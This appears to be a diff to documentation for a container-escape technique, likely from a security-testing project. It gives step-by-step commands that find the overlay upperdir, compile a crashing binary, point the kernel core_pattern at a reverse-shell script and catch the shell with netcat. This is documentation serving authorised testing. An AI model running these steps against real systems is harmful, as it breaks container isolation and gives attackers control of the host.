@@ -40,7 +40,7 @@ proc /hostproc proc rw,nosuid,nodev,noexec,relatime 0 0
 First find the path of the container’s filesystem on the host. This can be done by retrieving the current mounts (see [VOLUME_DISCOVER](./VOLUME_DISCOVER.md#checks)). Looks for the `upperdir` value of the overlayfs entry associated with containerd:
 
 ```bash
-$ cat /etc/mtab
+$ cat /proc/mounts
 ...
 overlay / overlay rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/27/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/71/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/71/work 0 0
 ...
@@ -52,7 +52,7 @@ $ OVERLAY_PATH=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapsh
 Oneliner alternative:
 
 ```bash
-export OVERLAY_PATH=$(cat /proc/mounts | grep -oe upperdir=.*, | cut -d = -f 2 | tr -d , | head -n 1)
+export OVERLAY_PATH=$(cat /proc/mounts | grep -oe upperdir=[^,]*, | cut -d = -f 2 | tr -d , | head -n 1)
 ```
 
 Next create a mini program that will crash immediately and generate a kernel coredump. For example:
@@ -64,10 +64,17 @@ echo 'int main(void) {
 		buf[i] = 1;
 	}
 	return 0;
-}' > /tmp/crash.c && gcc -o crash /tmp/crash.c
+}' > /tmp/crash.c 
 ```
 
-Compile the program and copy the binary into the container as crash. Next write a shell script to be triggered inside the container’s file system as `shell.sh`:
+Compile the program and copy the binary into the container as crash:
+```bash
+apt update 
+apt install gcc
+gcc -o crash /tmp/crash.c
+```
+
+Next write a shell script to be triggered inside the container’s file system as `shell.sh`:
 
 ```bash
 # Reverse shell
@@ -80,8 +87,10 @@ chmod a+x /tmp/shell.sh
 Finally write the `usermode_helper` script path to the `core_pattern` helper path and trigger the container escape:
 
 ```bash
-cd /hostproc/sys/kernel
+cd /proc/sys/kernel
 echo "|$OVERLAY_PATH/tmp/shell.sh" > core_pattern
+cd
+apt install netcat-traditional
 sleep 5 && ./crash & nc -l -vv -p 9000
 ```
 
